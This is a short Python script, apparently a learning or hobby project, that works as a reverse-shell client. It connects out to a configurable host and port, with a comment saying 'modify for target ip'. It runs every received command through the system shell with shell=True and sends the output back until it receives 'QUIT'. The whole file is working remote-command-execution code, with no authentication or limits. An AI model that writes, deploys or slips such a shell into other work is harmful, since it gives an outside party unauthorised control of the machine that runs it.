import socket
import subprocess

client_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM) #AF_INT = ipv4 SOCK_STREAM for TCP

host = socket.gethostname() #modify for target ip
port = 5000 #modify for target port

client_socket.connect((host, port))

while True:
    command = client_socket.recv(1024).decode('utf-8')

    if command.upper() == 'QUIT':
        break

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    client_socket.sendall(output.encode('utf-8'))

client_socket.close()
print(f"Fermeture de la connexion avec {host}:{port}")
